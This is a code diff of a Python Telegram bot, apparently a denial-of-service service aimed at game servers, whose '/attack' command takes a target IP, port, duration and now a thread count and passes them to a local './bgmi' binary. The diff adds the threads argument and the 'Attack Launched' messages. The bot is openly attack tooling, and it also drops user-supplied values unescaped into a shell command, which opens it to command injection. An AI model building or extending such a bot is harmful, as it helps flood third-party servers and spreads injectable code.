@@ -26,15 +26,15 @@ async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
         "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration>*\n"
+        "*Use /attack <ip> <port> <duration> <threads>*\n"
         "*Let the war begin! ⚔️💥*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context):
+async def run_attack(chat_id, ip, port, duration, threads, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration}",
+            f"./bgmi {ip} {port} {duration} {threads}",  # Pass threads to ./bgmi
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -60,19 +60,21 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+    if len(args) != 4:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
         return
 
-    ip, port, duration = args
+    ip, port, duration, threads = args
+    threads = int(threads)  # Convert threads to integer
     await context.bot.send_message(chat_id=chat_id, text=( 
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
+        f"*🧵 Threads: {threads}*\n"
         f"*🔥 Let the battlefield ignite! 💥*"
     ), parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))
 
 async def approve_user(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
